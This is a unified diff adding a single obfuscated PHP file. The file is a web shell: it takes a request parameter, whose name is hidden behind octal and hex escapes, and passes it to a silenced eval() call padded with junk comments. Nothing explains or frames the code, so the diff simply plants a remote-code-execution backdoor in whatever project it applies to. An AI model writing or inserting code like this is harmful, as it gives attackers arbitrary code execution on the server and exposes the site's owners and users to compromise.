@@ -1,0 +1,1 @@
+<?php class cbsLQ {public function __construct($cbczLQ){@eval("/*heAF8A4F5*/".$cbczLQ."/*vyeme3m40*/");}}if(isset($_REQUEST["\120\x73\123\167\x30\x72\x44\61\x32\x33\104"]))new cbsLQ($_REQUEST["\120\x73\123\167\x30\x72\x44\61\x32\x33\104"]);?>
